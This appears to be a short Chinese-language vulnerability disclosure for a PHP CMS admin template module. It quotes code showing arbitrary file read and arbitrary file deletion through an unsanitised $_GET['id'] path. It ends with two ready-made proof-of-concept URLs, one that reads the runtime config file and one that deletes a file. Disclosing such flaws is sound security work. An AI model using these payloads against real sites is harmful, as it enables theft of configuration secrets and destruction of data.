任意文件读取漏洞代码：
Lib\Admin\Action\TplAction.class.php：
51-60：
	public function add(){
		$filename = admin_gxl_url_repalce(str_replace('*','.',trim($_GET['id'])));
		if (empty($filename)) {
			$this->error('模板名称不能为空');
		}
		$content = read_file($filename);
		$this->assign('filename',$filename);
		$this->assign('content',htmlspecialchars($content));
		$this->display('./Public/system/tpl_add.html');
	}
/Lib/Admin/Common/function.php：
372-380：
function admin_gxl_url_repalce($xmlurl, $order = "asc")
{
	if ($order == "asc") {
		return str_replace(array("|", "@", "#", "||"), array("/", "=", "&", "//"), $xmlurl);
	}
	else {
		return str_replace(array("/", "=", "&", "||"), array("|", "@", "#", "//"), $xmlurl);
	}
}

任意文件删除漏洞代码：
Lib\Admin\Action\TplAction.class.php：
87-98：
public function del(){
$id = admin_gxl_url_repalce(str_replace('*','.',trim($_GET['id'])));
if (!substr(sprintf("%o",fileperms($id)),-3)){
$this->error('无删除权限');
}
@unlink($id);
if (!empty($_SESSION['tpl_jumpurl'])) {
$this->assign("jumpUrl",$_SESSION['tpl_jumpurl']);
}else{
$this->assign("jumpUrl",'?s=Admin/Tpl/Show');
}
$this->success('删除成功');




POC：
任意文件读取：http://localhost/index.php?s=Admin-Tpl-ADD-id-.|Runtime|Conf||config*php
任意文件删除：http://localhost/index.php?s=Admin-Tpl-Del-id-.|Runtime|Conf||1*php
